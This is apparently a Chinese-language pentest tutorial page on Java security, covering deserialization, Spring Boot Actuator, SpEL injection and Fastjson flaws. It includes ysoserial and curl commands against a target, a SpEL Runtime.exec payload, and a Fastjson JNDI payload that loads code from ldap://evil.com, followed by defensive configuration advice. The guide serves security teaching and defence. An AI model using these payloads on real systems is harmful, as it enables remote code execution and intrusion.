# Java安全

Java安全是渗透测试中的重要领域，涉及Java应用程序的漏洞发现、利用和防护。

## 🎯 Java安全概述

Java安全测试主要包括：
- **反序列化漏洞**：利用不安全的反序列化过程
- **框架漏洞**：Spring、Struts等框架的安全问题
- **权限绕过**：Shiro、Spring Security等权限控制绕过
- **代码执行**：模板注入、表达式注入等

## 🔍 常见Java漏洞类型

### 1. 反序列化漏洞

#### 原理分析
```java
// 不安全的反序列化示例
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject(); // 危险操作
```

#### 利用工具
- **ysoserial** - Java反序列化利用工具
- **marshalsec** - 各种序列化库的利用工具

#### 检测方法
```bash
# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections6 "calc" > payload.ser

# 发送到目标应用
curl -X POST http://target.com/api -d @payload.ser
```

### 2. Spring Boot漏洞

#### Actuator未授权访问
```http
# 敏感端点访问
GET /actuator/env HTTP/1.1
GET /actuator/heapdump HTTP/1.1
GET /actuator/trace HTTP/1.1
```

#### SpEL表达式注入
```java
// 危险的SpEL表达式使用
@Value("#{${user.input}}")  // 用户可控输入
private String userValue;

// 利用payload
#{T(java.lang.Runtime).getRuntime().exec('calc')}
```

### 3. Fastjson漏洞

#### 漏洞版本
- Fastjson ≤ 1.2.24
- Fastjson ≤ 1.2.47  
- Fastjson ≤ 1.2.68

#### 利用示例
```json
{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"ldap://evil.com:1389/Exploit",
    "autoCommit":true
}
```

## ⚡ 实战测试流程

### 1. 信息收集
```bash
# 识别Java应用
nmap -sV -p 8080,8443,9200,9300 target.com

# 框架指纹识别
whatweb http://target.com
wappalyzer target.com
```

### 2. 漏洞检测
```python
# 反序列化检测脚本
import requests
import base64

def test_deserialization(url):
    # ysoserial payload
    payload = base64.b64decode("rO0AB...") # 恶意序列化数据
    
    headers = {
        'Content-Type': 'application/x-java-serialized-object'
    }
    
    response = requests.post(url, data=payload, headers=headers)
    return response.status_code
```

### 3. 自动化扫描
```bash
# 使用工具扫描
python3 JNDIExploit.py -i target.com -p 1389

# Fastjson扫描
python3 fastjson_scan.py -u http://target.com
```

## 🛠️ 常用工具

| 工具名称 | 功能 | 使用场景 |
|---------|------|----------|
| ysoserial | 反序列化利用 | 生成恶意序列化对象 |
| JNDIExploit | JNDI注入 | LDAP/RMI服务搭建 |
| marshalsec | 序列化测试 | 多种序列化格式测试 |
| Burp Suite | Web测试平台 | 请求拦截和修改 |

## 🛡️ 防护建议

### 1. 反序列化防护
```java
// 使用白名单过滤
public class SafeObjectInputStream extends ObjectInputStream {
    private static final String[] allowedClasses = {
        "java.lang.String",
        "java.lang.Integer"
    };
    
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) 
            throws IOException, ClassNotFoundException {
        String className = desc.getName();
        for (String allowed : allowedClasses) {
            if (className.equals(allowed)) {
                return super.resolveClass(desc);
            }
        }
        throw new InvalidClassException("Class not allowed: " + className);
    }
}
```

### 2. Spring Boot安全配置
```yaml
# application.yml
management:
  endpoints:
    enabled-by-default: false
    web:
      exposure:
        include: health,info  # 只暴露必要端点
  endpoint:
    health:
      enabled: true
```

### 3. 依赖管理
```xml
<!-- 及时更新依赖版本 -->
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.83</version> <!-- 使用最新安全版本 -->
</dependency>
```

## 📚 学习资源

### 官方文档
- [Oracle Java Security](https://docs.oracle.com/javase/security/)
- [Spring Security Reference](https://docs.spring.io/spring-security/reference/)
- [OWASP Java Security](https://owasp.org/www-project-java/)

### 实验环境
- **vulhub** - Docker化的漏洞环境
- **VulnApp** - Java漏洞应用集合
- **WebGoat** - OWASP安全测试应用

### 工具下载
- [ysoserial releases](https://github.com/frohoff/ysoserial)
- [JNDIExploit](https://github.com/WhiteHSBG/JNDIExploit)
- [marshalsec](https://github.com/mbechler/marshalsec)

---

> ⚠️ **重要提醒**: Java安全测试需要深入理解JVM机制和框架原理，建议在合法授权的环境下进行测试！
